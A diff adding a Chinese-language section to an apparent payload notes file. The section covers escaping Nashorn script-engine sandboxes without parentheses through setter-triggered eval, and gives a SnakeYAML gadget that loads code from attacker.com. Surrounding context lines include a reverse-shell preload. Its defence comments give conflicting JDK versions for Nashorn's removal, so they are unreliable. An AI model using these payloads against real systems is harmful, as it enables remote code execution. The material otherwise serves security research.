@@ -685,3 +685,88 @@ GIT_DIR=/tmp/evil_repo/.git git status
 NODE_OPTIONS="--require=/tmp/reverse_shell.js" node /app/server.js
 # reverse_shell.js is loaded before server.js
 ```
+
+---
+
+## 15. NASHORN JAVASCRIPT 引擎无括号绕过 (from leavesongs.com)
+
+> 当 Java 的 Nashorn 脚本引擎禁止使用小括号 `(` 和中括号 `[` 时执行任意代码 [1]
+
+### 15.1 核心原理
+
+Nashorn 脚本中访问属性时会隐式调用 Java 对象的 setter/getter，类似于 Fastjson 反序列化漏洞的利用思路。
+
+```javascript
+// 正常调用（需要括号）
+eval("Runtime.exec('calc')")
+
+// setter 隐式调用（无需括号）
+user.name = "Runtime.exec('calc')";  // 调用 setName()
+print(user.name);                     // 调用 getName()
+```
+
+### 15.2 Java 接口/抽象类利用
+
+Nashorn 支持在 JavaScript 中实现 Java 接口，通过重写方法实现无括号执行：
+
+```javascript
+// 实现 Customizer 接口，重写 setObject 方法
+var a = new java.beans.Customizer {
+    setObject: eval
+}
+
+// 触发 setter 调用 eval
+a.object = "java.lang.Runtime.getRuntime().exec('calc.exe')";
+```
+
+**关键点**:
+- 无参构造函数可省略括号：`new java.beans.Customizer {...}`
+- setter 调用无需括号：属性赋值自动触发 `setObject()`
+- `eval` 函数接收字符串参数并执行
+
+### 15.3 其他可用接口
+
+| 接口/抽象类 | 方法 | 参数类型 | 用途 |
+|------------|------|---------|------|
+| `java.beans.Customizer` | `setObject(Object)` | Object | 通用执行 |
+| `java.beans.PropertyEditor` | `setValue(Object)` | Object | 属性编辑 |
+| `javax.naming.spi.ObjectFactory` | `getObjectInstance(...)` | 多参数 | JNDI 利用 |
+
+### 15.4 实际应用场景
+
+**场景1: 表达式引擎沙箱逃逸**
+```java
+// 安全沙箱禁用括号
+ScriptEngineManager factory = new ScriptEngineManager();
+ScriptEngine engine = factory.getEngineByName("nashorn");
+engine.eval(userInput);  // 输入无括号 payload
+```
+
+**场景2: Java 反序列化链中的脚本执行**
+```yaml
+# SnakeYAML + Nashorn 组合
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL ["http://attacker.com/"]
+  ]]
+]
+```
+
+### 15.5 防御建议
+
+```java
+// 1. 禁用 Nashorn 引擎（JDK 11+ 已移除）
+System.setProperty("nashorn.args", "--no-java");
+
+// 2. 使用沙箱 SecurityManager（JDK 17+ 已弃用）
+Policy.setPolicy(new RestrictedPolicy());
+System.setSecurityManager(new SecurityManager());
+
+// 3. 升级到 JDK 15+（Nashorn 已被移除）
+// 替换为 GraalVM JavaScript 引擎，配置适当沙箱
+```
+
+## 参考
+
+[1] Phith0n. "当Nashorn失去括号：非典型Java命令执行绕过". leavesongs.com. 2024-04-12.
+    https://www.leavesongs.com/PENETRATION/nashorn-rce-without-parentheses.html
